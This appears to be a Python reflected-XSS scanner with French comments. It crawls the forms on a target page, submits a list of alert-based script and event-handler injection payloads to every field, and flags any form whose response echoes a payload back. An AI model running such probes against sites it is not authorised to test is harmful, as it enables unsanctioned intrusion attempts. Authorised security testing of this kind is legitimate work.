import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerable_points = []

    # Payloads XSS de test
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert(1)</script>',
        'javascript:alert("XSS")',
        '<svg/onload=alert("XSS")>'
    ]

    def scan(self):
        # Analyse initiale de la page
        response = self.session.get(self.target_url)
        soup = BeautifulSoup(response.content, 'html.parser')

        # Recherche de tous les formulaires
        forms = soup.find_all('form')
        print(f"[+] Found {len(forms)} forms on {self.target_url}")

        for form in forms:
            self.test_form(form)

    def test_form(self, form):
        # Extraction des détails du formulaire
        details = {}
        action = form.get('action')
        url = urljoin(self.target_url, action)
        method = form.get('method', 'get').lower()

        # Collecte des inputs
        inputs = form.find_all('input')
        form_data = {}
        for input_tag in inputs:
            name = input_tag.get('name')
            type_ = input_tag.get('type', 'text')
            if name:
                form_data[name] = 'test' if type_ != 'submit' else ''

        # Test pour chaque payload
        for payload in self.xss_payloads:
            data = {}
            for field in form_data:
                data[field] = payload

            if method == 'post':
                res = self.session.post(url, data=data)
            else:
                res = self.session.get(url, params=data)

            # Vérification de la réflexion
            if payload in res.text:
                print(f"[!] Potential XSS found in {url}")
                print(f"    Payload: {payload}")
                print(f"    Form fields: {list(form_data.keys())}\n")
                self.vulnerable_points.append({
                    'url': url,
                    'payload': payload,
                    'fields': form_data
                })

    def report(self):
        print("\nScan Report:")
        for vuln in self.vulnerable_points:
            print(f"URL: {vuln['url']}")
            print(f"Payload: {vuln['payload']}")
            print("Affected Fields:")
            for field in vuln['fields']:
                print(f" - {field}")
            print("-" * 50)

if __name__ == "__main__":
    scanner = XSSScanner('http://vulnerable-site.com')
    scanner.scan()
    scanner.report()